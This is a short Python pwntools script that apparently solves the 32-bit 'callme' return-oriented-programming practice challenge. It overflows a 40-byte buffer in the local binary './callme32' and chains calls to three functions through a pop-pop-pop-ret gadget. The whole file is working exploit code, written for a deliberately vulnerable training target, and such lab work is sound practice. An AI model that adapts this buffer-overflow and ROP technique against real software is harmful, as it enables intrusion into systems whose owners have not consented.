
import pwn
from GizmoMaker import GizmoMaker

popx3_ret = 0x80488a9  # pop esi; pop edi; pop ebp; ret;
callme_one = 0x080485c0
callme_two = 0x08048620
callme_three = 0x080485b0
gizmo_maker = GizmoMaker(packer=pwn.p32)
template = gizmo_maker.get_template_template()

template["name"] = "call_function"
template["Constants"] = ["pop_addr", "1", "2", "3"]
template["Parameters"] = ["function_addr"]
template["Queue"] = ["function_addr",
                     "pop_addr",
                     "1", "2", "3"]

gizmo_maker.add_template(template)
gizmo_maker.init_template("call_function", popx3_ret, 0x1, 0x2, 0x3)

payload = ('D'*40).encode()  # Fill buffer
payload += 'BBBB'.encode()  # EBP, junk
payload += gizmo_maker.execute("call_function", callme_one)
payload += gizmo_maker.execute("call_function", callme_two)
payload += gizmo_maker.execute("call_function", callme_three)
payload += '\n'.encode()


p = pwn.tubes.process.process(["./callme32"], shell=True)
p.send_raw(payload)
p.interactive()
p.close()



